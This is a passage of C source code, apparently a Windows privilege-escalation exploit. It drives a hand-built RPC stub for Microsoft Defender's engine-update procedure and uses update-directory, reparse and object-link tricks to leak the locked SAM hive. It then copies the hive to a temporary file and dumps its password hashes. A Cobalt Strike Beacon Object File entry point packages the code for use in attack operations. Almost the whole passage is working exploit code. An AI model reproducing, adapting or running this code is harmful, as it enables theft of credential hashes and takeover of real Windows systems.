			UnlockFile(hleakedfile, NULL, NULL, NULL, NULL);
			filelocked = false;
			CloseHandle(hleakedfile);
	
			ZeroMemory(copiedfilepath, sizeof(copiedfilepath));

			UuidCreate(&uid);
			if (UuidToStringW(&uid, &wuid) != RPC_S_OK) {
				printf("Failed to convert UUID to string\n");
				goto cleanup;
			}
			wuid2 = (wchar_t*)wuid;
			wchar_t env2[MAX_PATH] = { 0 };
			wcscpy(env2, L"%TEMP%\\");
			wcscat(env2, wuid2);

			ExpandEnvironmentStrings(env2, copiedfilepath, sizeof(copiedfilepath) / sizeof(wchar_t));
			RpcStringFreeW(&wuid);
			wuid = NULL;

			hleakedfile = CreateFile(copiedfilepath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (!hleakedfile || hleakedfile == INVALID_HANDLE_VALUE)
			{
				printf("Failed to create leaked file, error : %d", GetLastError());
				goto cleanup;
			}
			if (!WriteFile(hleakedfile, leakedfilebuff, _filesz.QuadPart, &__readsz, NULL))
			{
				printf("Failed to write leaked file, error : %d", GetLastError());
				CloseHandle(hleakedfile);
				hleakedfile = NULL;
				
				DeleteFile(copiedfilepath);
				goto cleanup;
			}
			CloseHandle(hleakedfile);
			hleakedfile = NULL;
			printf("[6/6] SAM read complete.\n");
			SetEvent(hreleaseready);
			DumpSAMHashes(copiedfilepath);
			WaitForSingleObject(hthread, INFINITE);
			CloseHandle(hthread);
			hthread = NULL;


			
		}
cleanup:

	if (hdir)
		CloseHandle(hdir);
	if (hupdatefile)
		CloseHandle(hupdatefile);
	if (hreparsedir)
		CloseHandle(hreparsedir);
	if (hobjlink)
		NtClose(hobjlink);
	if (hthread) {
		WaitForSingleObject(hthread, 5000);
		CloseHandle(hthread);
	}
	if (threadargs.hevent)
		CloseHandle(threadargs.hevent);
	if (fri)
		free(fri);
	if (rdb)
		HeapFree(GetProcessHeap(), NULL, rdb);
	if (ov.hEvent)
		CloseHandle(ov.hEvent);
	if (ovd.hEvent)
		CloseHandle(ovd.hEvent);

	if (hreleaseready)
	{
		SetEvent(hreleaseready);
		Sleep(1000);
		CloseHandle(hreleaseready);
	}
	if (hleakedfile)
	{
		if (filelocked)
			UnlockFile(hleakedfile, NULL, NULL, NULL, NULL);
		CloseHandle(hleakedfile);
	}
	if (leakedfilebuff)
		free(leakedfilebuff);
	if (hcurrentthread)
		CloseHandle(hcurrentthread);
	if (wuid)
		RpcStringFreeW(&wuid);
	if (needupdatedircleanup)
	{
		wchar_t dirtoclean[MAX_PATH] = { 0 };
		wcscpy(dirtoclean, dirmoved ? newtmp : updatepath);
		UpdateFilesListCurrent = UpdateFilesList;
		while(UpdateFilesListCurrent)
		{
			if (UpdateFilesListCurrent->filecreated)
			{
				wchar_t filetodel[MAX_PATH] = { 0 };
				wcscpy(filetodel, dirtoclean);
				wcscat(filetodel, L"\\");
				size_t remaining = MAX_PATH - wcslen(filetodel);
				MultiByteToWideChar(CP_ACP, NULL, UpdateFilesListCurrent->filename, -1, &filetodel[wcslen(filetodel)], remaining);
				DeleteFile(filetodel);
			}
			if (UpdateFilesListCurrent->filebuff)
				free(UpdateFilesListCurrent->filebuff);
			UpdateFiles* UpdateFilesListOld = UpdateFilesListCurrent;
			UpdateFilesListCurrent = UpdateFilesListCurrent->next;
			free(UpdateFilesListOld);
		}
		RemoveDirectory(dirtoclean);
	}
	else if (UpdateFilesList)
	{
		// UpdateFilesList was obtained but directory was never created; free the list.
		UpdateFilesListCurrent = UpdateFilesList;
		while (UpdateFilesListCurrent)
		{
			if (UpdateFilesListCurrent->filebuff)
				free(UpdateFilesListCurrent->filebuff);
			UpdateFiles* UpdateFilesListOld = UpdateFilesListCurrent;
			UpdateFilesListCurrent = UpdateFilesListCurrent->next;
			free(UpdateFilesListOld);
		}
	}

	return 0;
}

#ifdef BOF
#ifdef __cplusplus
extern "C"
#endif

// BOF entry point that parses an optional leak path and runs the main flow.
void go(char* args, int alen)
{
	datap parser = { 0 };
	int leak_arg_len = 0;
	char* leak_arg = NULL;
	char leak_path_a[MAX_PATH] = { 0 };
	wchar_t leak_path_w[MAX_PATH] = { 0 };
	const wchar_t* leak_target = NULL;

	if (args && alen > 0) {
		BeaconDataParse(&parser, args, alen);
		leak_arg = BeaconDataExtract(&parser, &leak_arg_len);
		if (leak_arg && leak_arg_len > 0) {
			int copy_len = leak_arg_len < (MAX_PATH - 1) ? leak_arg_len : (MAX_PATH - 1);
			memcpy(leak_path_a, leak_arg, copy_len);
			leak_path_a[copy_len] = '\0';
			if (toWideChar(leak_path_a, leak_path_w, MAX_PATH))
				leak_target = leak_path_w;
			else
				BeaconPrintf(CALLBACK_ERROR, "failed to convert BOF string argument to wide char");
		}
	}

	RunMain(leak_target);

}
#else

// Standalone executable entry point for local testing.
int wmain()
{
	return RunMain(NULL);
}
#endif







static const RPC_SYNTAX_IDENTIFIER kWdRpcTransferSyntax2_0 =
{ {0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}}, {2,0} };



static const unsigned char kWdTypeFormatString[] = { 0x25, 0x5c }; 







static const unsigned char kWdProc42Format[] =
{
	0x00, 0x48,
	0x00, 0x00, 0x00, 0x00,
	0x2a, 0x00,
	0x28, 0x00,
	0x32, 0x00,
	0x00, 0x00,
	0x08, 0x00,
	0x24, 0x00,
	0x46, 0x04,
	0x0a, 0x01,
	0x00, 0x00,
	0x00, 0x00,
	0x00, 0x00,
	0x00, 0x00,
	0x48, 0x00,
	0x08, 0x00,
	0x08, 0x00,
	0x0b, 0x01,
	0x10, 0x00,
	0x00, 0x00, 
	0x50, 0x21,
	0x18, 0x00,
	0x10, 0x00,
	0x70, 0x00,
	0x20, 0x00,
	0x08, 0x00
};

#ifdef __cplusplus
extern "C"
#endif

// Build a minimal RPC client stub and call Defender Proc42.
long Proc42_ServerMpUpdateEngineSignature(
	handle_t IDL_handle,
	long arg_1,
	wchar_t* arg_2,
	error_status_t* arg_3)
{
	
	
	
	
	unsigned short fmtOffsets[43];
	memset(fmtOffsets, 0, sizeof(fmtOffsets));
	fmtOffsets[42] = 0;

	MIDL_STUB_DESC stubDesc;
	memset(&stubDesc, 0, sizeof(stubDesc));
	stubDesc.pfnAllocate  = MIDL_user_allocate;
	stubDesc.pfnFree      = MIDL_user_free;
	stubDesc.pFormatTypes = (unsigned char*)kWdTypeFormatString;
	stubDesc.fCheckBounds = 1;
	stubDesc.Version      = 0x60001;
	stubDesc.MIDLVersion  = 0x8010274;
	stubDesc.mFlags       = 0x2000001;
	MIDL_SYNTAX_INFO syntaxInfo[1];
	memset(syntaxInfo, 0, sizeof(syntaxInfo));
	syntaxInfo[0].TransferSyntax = *(RPC_SYNTAX_IDENTIFIER*)&kWdRpcTransferSyntax2_0;
	syntaxInfo[0].ProcString = (PFORMAT_STRING)kWdProc42Format;
	syntaxInfo[0].FmtStringOffset = fmtOffsets;
	syntaxInfo[0].TypeString = (PFORMAT_STRING)kWdTypeFormatString;

	MIDL_STUBLESS_PROXY_INFO proxyInfo;
	memset(&proxyInfo, 0, sizeof(proxyInfo));
	proxyInfo.pStubDesc          = &stubDesc;
	proxyInfo.ProcFormatString   = (PFORMAT_STRING)kWdProc42Format;
	proxyInfo.FormatStringOffset = fmtOffsets;
	proxyInfo.pTransferSyntax    = (RPC_SYNTAX_IDENTIFIER*)&kWdRpcTransferSyntax2_0;
	proxyInfo.nCount             = 1;
	proxyInfo.pSyntaxInfo        = syntaxInfo;

	RPC_CLIENT_INTERFACE clientIface;
	memset(&clientIface, 0, sizeof(clientIface));
	clientIface.Length = sizeof(RPC_CLIENT_INTERFACE);
	clientIface.InterfaceId.SyntaxGUID.Data1    = 0xc503f532;
	clientIface.InterfaceId.SyntaxGUID.Data2    = 0x443a;
	clientIface.InterfaceId.SyntaxGUID.Data3    = 0x4c69;
	clientIface.InterfaceId.SyntaxGUID.Data4[0] = 0x83;
	clientIface.InterfaceId.SyntaxGUID.Data4[1] = 0x00;
	clientIface.InterfaceId.SyntaxGUID.Data4[2] = 0xcc;
	clientIface.InterfaceId.SyntaxGUID.Data4[3] = 0xd1;
	clientIface.InterfaceId.SyntaxGUID.Data4[4] = 0xfb;
	clientIface.InterfaceId.SyntaxGUID.Data4[5] = 0xdb;
	clientIface.InterfaceId.SyntaxGUID.Data4[6] = 0x38;
	clientIface.InterfaceId.SyntaxGUID.Data4[7] = 0x39;
	clientIface.InterfaceId.SyntaxVersion.MajorVersion = 2;
	clientIface.InterfaceId.SyntaxVersion.MinorVersion = 0;
	clientIface.TransferSyntax = *(RPC_SYNTAX_IDENTIFIER*)&kWdRpcTransferSyntax2_0;
	clientIface.InterpreterInfo = &proxyInfo;
	
	
	
	
	
	clientIface.Flags = 0;

	stubDesc.RpcInterfaceInformation = &clientIface;
	stubDesc.ProxyServerInfo = &proxyInfo;

	
	
	
	
	
	ULONG_PTR frame[5] = {
		(ULONG_PTR)IDL_handle,
		(ULONG_PTR)(LONG_PTR)arg_1,
		(ULONG_PTR)arg_2,
		(ULONG_PTR)arg_3,
		0
	};
	typedef CLIENT_CALL_RETURN (RPC_ENTRY *pfnNdrpClientCall2_t)(
		PMIDL_STUB_DESC, PFORMAT_STRING, unsigned char*);
	HMODULE hrpcrt4 = GetModuleHandleW(L"rpcrt4.dll");
	pfnNdrpClientCall2_t pfnNdrp = hrpcrt4
		? (pfnNdrpClientCall2_t)GetProcAddress(hrpcrt4, "NdrpClientCall2")
		: NULL;
	if (!pfnNdrp) {
		CLIENT_CALL_RETURN fail = { 0 };
		return (long)fail.Simple;
	}
	CLIENT_CALL_RETURN ret = pfnNdrp(
		&stubDesc,
		(PFORMAT_STRING)kWdProc42Format,
		(unsigned char*)frame);
	return (long)ret.Simple;
}
